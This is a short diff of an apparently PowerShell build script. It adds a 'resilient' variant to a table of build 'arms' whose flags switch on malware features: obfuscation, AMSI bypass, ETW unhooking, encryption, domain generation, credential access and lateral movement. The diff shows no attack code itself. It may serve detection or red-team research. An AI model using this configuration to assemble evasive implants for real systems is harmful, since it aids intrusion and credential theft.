@@ -149,9 +149,10 @@ $arms = [ordered]@{
     'dga'       = @('PX_DGA=1')
     'cred'      = @('PX_CRED_ACCESS=1')
     'lateral'   = @('PX_LATERAL=1')
+    'resilient' = @('PX_RESILIENT=1')
     'full'      = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                     'PX_ENCRYPT=1', 'PX_DGA=1', 'PX_CRED_ACCESS=1',
-                    'PX_LATERAL=1')
+                    'PX_LATERAL=1', 'PX_RESILIENT=1')
 }
 
 $built = @()
